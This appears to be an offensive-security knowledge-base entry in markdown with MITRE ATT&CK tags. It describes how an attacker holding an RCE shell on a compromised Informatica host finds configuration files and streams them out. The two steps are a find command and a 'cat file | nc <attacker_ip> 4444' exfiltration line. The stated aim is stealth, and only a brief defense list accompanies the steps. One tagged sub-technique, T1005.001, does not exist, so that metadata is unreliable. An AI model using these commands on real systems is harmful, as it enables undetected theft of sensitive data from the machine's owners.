---
id: proc-exfil-smi-rce-001
tags:
  - exfiltration
  - file-download
  - rce
type: procedure
tools:
  - '[[tools/netcat]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/nc-transfer]]'
verified: false
platforms:
  - Network
  - Embedded
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Data from Local System]]'
  - '[[Exfiltration Over Command and Control Channel]]'
updated_at: '2025-12-14T17:23:27.352Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques:
  - '[[T1005.001]]'
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Data from Local System]]'
  - '[[Exfiltration Over Command and Control Channel]]'
---
# Exfiltrate Files via RCE

## Summary

This procedure uses an established RCE session from SMI exploitation to access and transfer sensitive files from the compromised Informatica machine to the attacker.

## Description

With RCE achieved, attackers can navigate the filesystem, identify sensitive data (e.g., configs, logs), and exfiltrate via network tools. This targets local storage on the embedded/network platform. Prerequisites: Active RCE shell. Expected outcomes: Secure transfer of files without detection.

## Requirements

1. Active RCE access to target shell
2. Attacker-controlled server for receiving files
3. Network path for outbound connections from target

## Defense

Defensive measures and detection strategies:

- Enable file integrity monitoring (e.g., Tripwire)
- Log and alert on unexpected outbound connections
- Harden filesystem permissions on sensitive directories

## Objectives

1. Collect sensitive data from local system
2. Exfiltrate to external location
3. Maintain stealth during transfer

## Instructions

### Step 1: Locate Sensitive Files

**Context**: Use RCE to enumerate directories and identify targets.

**Command** (Via RCE Shell):
```bash
find /opt/informatica -name "*.conf" -type f
```

> Lists configuration files; expected output: Paths to sensitive files.

### Step 2: Transfer Files Outbound

**Context**: Pipe file contents to a network tool for exfiltration.

**Command** ([[commands/nc-transfer]]):
```bash
cat /path/to/sensitive.conf | nc <attacker_ip> 4444
```

> Streams file to attacker's netcat listener. Expected output: File received on attacker side.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Data from Local System]]
- [[Exfiltration Over Command and Control Channel]]

### Sub-Techniques

- [[T1005.001]]

## Commands Used

- [[commands/nc-transfer]]

## Tools Used

- [[tools/netcat]]

## Tags

- [[Exfiltration]]
- [[rce]]
